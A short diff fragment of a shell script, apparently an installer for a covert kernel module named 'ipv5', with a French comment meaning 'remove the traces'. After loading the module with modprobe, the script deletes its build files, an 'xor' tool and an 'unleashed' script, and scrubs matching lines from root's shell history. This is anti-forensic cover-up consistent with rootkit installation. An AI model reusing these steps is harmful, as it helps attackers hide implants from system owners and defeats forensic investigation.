@@ -29,9 +29,10 @@ depmod -a 2>/dev/null
 modprobe ipv5
 
 # supprimer les traces
-rm ipv5.ko
-sed -i '/ipv5/d' /root/.ash_history
-sed -i '/insertion/d' /root/.ash_history
-rm insertion_script
+rm ipv5.*
+rm Makefile
 rm xor
 rm xor.c
+sed -i '/ipv5/d' /root/.ash_history
+sed -i '/unleashed/d' /root/.ash_history
+rm unleashed 
